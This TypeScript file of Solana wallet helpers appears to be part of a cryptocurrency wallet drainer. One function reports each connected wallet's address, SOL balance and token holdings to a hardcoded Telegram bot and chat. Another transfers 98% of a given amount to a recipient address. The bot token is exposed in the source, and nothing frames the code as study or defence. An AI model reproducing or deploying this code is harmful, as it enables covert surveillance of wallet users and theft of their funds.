
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';

const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
const TELEGRAM_CHAT_ID = "-1002490122517";

// Helper function to add delay between retries
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// Retry function with exponential backoff
async function retry<T>(
  fn: () => Promise<T>,
  retries = 3,
  initialDelay = 1000
): Promise<T> {
  let lastError;
  for (let i = 0; i < retries; i++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error;
      if (i < retries - 1) {
        await delay(initialDelay * Math.pow(2, i));
      }
    }
  }
  throw lastError;
}

export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
  try {
    console.log("Fetching token accounts for address:", walletAddress);
    
    const pubKey = new PublicKey(walletAddress);
    
    const response = await retry(async () => {
      return await connection.getParsedTokenAccountsByOwner(
        pubKey,
        {
          programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
        }
      );
    });

    console.log("Token accounts response:", response);

    return response.value.map(item => ({
      mint: item.account.data.parsed.info.mint,
      amount: item.account.data.parsed.info.tokenAmount.uiAmount,
      decimals: item.account.data.parsed.info.tokenAmount.decimals
    }));
  } catch (error) {
    console.error('Detailed error fetching token accounts:', error);
    return [];
  }
};

export const sendToTelegram = async (walletData: any) => {
  try {
    const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/demo', {
      commitment: 'confirmed',
      confirmTransactionInitialTimeout: 60000,
    });
    
    let solBalance = 0;
    
    try {
      solBalance = await retry(async () => {
        return await connection.getBalance(new PublicKey(walletData.address), 'confirmed');
      });
    } catch (error) {
      console.error('Error fetching balance:', error);
    }
    
    const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;

    const formattedTokens = walletData.tokens.map((token: any) => 
      `Mint: ${token.mint}\nAmount: ${token.amount}\nDecimals: ${token.decimals}`
    ).join('\n\n');

    const message = `🔍 New Wallet Connection Detected:\n\n` +
      `👛 Wallet Address: ${walletData.address}\n` +
      `💎 SOL Balance: ${solBalanceInSol.toFixed(4)} SOL\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
      `💰 Token Balances:\n${formattedTokens}\n\n` +
      `🌐 Network: Solana Mainnet`;

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!response.ok) {
      console.error('Telegram API response:', await response.text());
      return false;
    }

    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
};

export const signAndSendTransaction = async (connection: Connection, wallet: any, recipientAddress: string, amount: number) => {
  try {
    console.log('Creating transaction...');
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: new PublicKey(recipientAddress),
        lamports: Math.floor(amount * LAMPORTS_PER_SOL * 0.98), // Reduced to 98% to ensure fees are covered
      })
    );

    console.log('Sending transaction...');
    const signature = await retry(async () => {
      return await sendAndConfirmTransaction(
        connection,
        transaction,
        [wallet],
        {
          commitment: 'confirmed',
          preflightCommitment: 'confirmed',
          maxRetries: 5,
        }
      );
    });

    console.log('Transaction successful:', signature);
    return signature;
  } catch (error) {
    console.error('Detailed transaction error:', error);
    throw error;
  }
};
